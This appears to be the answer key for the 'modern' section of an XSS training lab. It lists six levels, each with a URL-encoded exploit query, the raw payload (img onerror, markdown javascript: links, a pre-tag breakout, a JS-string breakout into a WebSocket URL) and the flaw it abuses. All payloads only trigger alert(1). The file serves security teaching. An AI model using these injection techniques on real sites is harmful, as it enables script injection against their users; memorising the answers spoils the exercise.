# modern — solutions

Modern framework / SaaS XSS shapes: dangerouslySetInnerHTML, markdown, hydration mismatch, etc.

### modern-level1

`/modern/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: input URI-encoded then decoded client-side into innerHTML

### modern-level2

`/modern/level2/?query=%5Bx%5D(javascript:alert(1))`

- payload: `[x](javascript:alert(1))`
- context: markdown link href no scheme check

### modern-level3

`/modern/level3/?query=%3C/pre%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</pre><script>alert(1)</script>`
- context: GraphQL error message inside `<pre>` (raw)

### modern-level4

`/modern/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: server encodes angles but client reads raw `location.search` and innerHTMLs it

### modern-level5

`/modern/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: 'query' raw in body (Origin header reflected separately, body XSS is direct)

### modern-level6

`/modern/level6/?wsurl=x%27);alert(1);//`

- payload: `x');alert(1);//`
- context: wsurl interpolated unescaped into JS string `new WebSocket('...')`
